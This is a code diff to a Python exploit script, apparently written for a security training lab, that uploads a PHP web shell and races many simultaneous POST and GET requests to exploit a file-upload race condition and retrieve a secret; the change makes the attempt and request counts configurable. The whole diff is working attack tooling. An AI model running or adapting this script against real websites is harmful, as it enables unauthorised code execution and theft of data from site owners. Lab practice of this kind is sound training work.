@@ -32,6 +32,9 @@ def main():
     parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
     parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
     parser.add_argument('--file', required=True, help='Path to the PHP web shell file')
+    parser.add_argument('--attempts', type=int, default=5, help='Number of attempts (default: 5)')
+    parser.add_argument('--post-tries', type=int, default=10, help='Number of POST requests per attempt (default: 10)')
+    parser.add_argument('--get-tries', type=int, default=10, help='Number of GET requests per attempt (default: 10)')
     args = parser.parse_args()
 
     URL = args.url.rstrip('/')
@@ -63,13 +66,14 @@ def main():
     filename = args.file.split("\\")[-1].split("/")[-1]
 
     print(f"{Fore.YELLOW}[*] Exploiting race condition...{Fore.RESET}")
-    for attempt in range(5):
-        print(f"{Fore.YELLOW}[*] Attempt {attempt + 1}/5{Fore.RESET}")
+    for attempt in range(args.attempts):
+        print(f"{Fore.YELLOW}[*] Attempt {attempt + 1}/{args.attempts}{Fore.RESET}")
         with ThreadPoolExecutor(max_workers=20) as executor:
-            # Submit 10 POST and 10 GET requests simultaneously for each attempt
+            # Submit POST and GET requests simultaneously for each attempt
             futures = []
-            for _ in range(10):
+            for _ in range(args.post_tries):
                 futures.append(executor.submit(upload_shell_and_race, session, filename, file_content, csrf_token))
+            for _ in range(args.get_tries):
                 futures.append(executor.submit(fetch_secret, session, filename))
             
             # Wait for all futures to complete before starting next attempt
@@ -82,7 +86,7 @@ def main():
                 except Exception as e:
                     continue  # Ignore any exceptions and continue with next request
 
-    print(f"{Fore.RED}[-] Failed to retrieve the secret after 5 attempts{Fore.RESET}")
+    print(f"{Fore.RED}[-] Failed to retrieve the secret after {args.attempts} attempts{Fore.RESET}")
 
 def fetch_secret(session, filename):
     try:
